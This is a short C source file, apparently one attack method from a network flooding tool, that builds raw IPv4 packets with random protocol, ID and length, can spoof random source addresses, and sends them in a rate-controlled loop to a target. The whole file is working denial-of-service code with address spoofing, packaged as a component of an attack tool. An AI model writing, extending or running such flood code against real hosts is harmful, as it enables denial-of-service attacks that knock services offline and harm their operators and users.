#include "../../include/methods.h"

static struct iphdr		*ip;
static u_char			frame[65535];

static void inline for_iteration(method_args_t *a)
{
	if (a->o->OPT_SOURCE[0]=='\a')
		ip->saddr=random_ipv4();
	ip->protocol=random_u8();
	ip->id=htons(random_u16());
	ip->tot_len=htons(sizeof(struct iphdr)+random_u8());

	ip->check=0;
	ip->check=in_check((u_short*)ip,sizeof(*ip));
}

void ip_empty_flood(method_args_t *a)
{
	memset(frame,0,sizeof(frame));
	memcpy(frame,a->machdr,14);
	ip=(struct iphdr*)(frame+14);

	ip->ihl=5;
	ip->version=4;
	ip->tos=0;
	ip->ttl=100;
	ip->frag_off=0;
	ip->saddr=a->source;
	ip->daddr=a->target;

	FLOODRUN(a,for_iteration(a),ethsend(a->fd,frame,ntohs(ip->tot_len)+14),
		a->o->OPT_PPS,a->o->OPT_TIME,a->o->OPT_UNLIMIT);
	
}
